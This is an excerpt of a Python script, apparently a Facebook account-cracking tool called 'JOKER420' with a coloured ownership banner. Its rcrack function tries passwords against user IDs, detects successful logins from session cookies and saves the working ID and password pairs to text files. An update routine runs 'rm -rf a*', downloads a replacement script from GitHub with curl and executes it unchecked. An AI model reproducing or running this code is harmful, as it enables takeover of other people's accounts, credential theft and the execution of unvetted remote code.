...
\33[1;37m----------------------------------------------
\33[1;91m→  \33[1;91m𝗢𝘄𝗻𝗲𝗿      :         𝗠𝗥 𝗞𝗢𝗞𝗢 𝗝𝗢𝗞𝗘𝗥 
\33[1;92m→  \33[1;92m𝗙𝗮𝗰𝗲𝗕𝗼𝗼𝗸   :     𝗛𝗗 𝗦𝗛𝗔𝗛𝗜 𝗝𝗢𝗞𝗘𝗥 
\33[1;93m→  \33[1;93m𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺   :      𝗡𝗢 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠
\33[1;94m→  \33[1;94m𝗧𝗼𝗼𝗹𝘀       :          𝗠𝗥 𝗛𝗗 𝗦𝗛𝗔𝗛𝗜 𝗝𝗢𝗞𝗘𝗥 
\33[1;95m→  \33[1;95m𝗩𝗲𝗿𝘀𝗶𝗼𝗻    :          0.1
\33[1;37m----------------------------------------------""")
...
try:
    ...
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/JOKER420.py > JOKER420.py')
        os.system('python JOKER420.py')
    else:pass
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[JOKER420-OK] '+cid+'|'+ps+'\033[0;97m')
                open('JOKER420-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[JOKER420-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('JOKER420-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m𝗦𝗛𝗔𝗛𝗜-𝗝𝗢𝗞𝗘𝗥\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
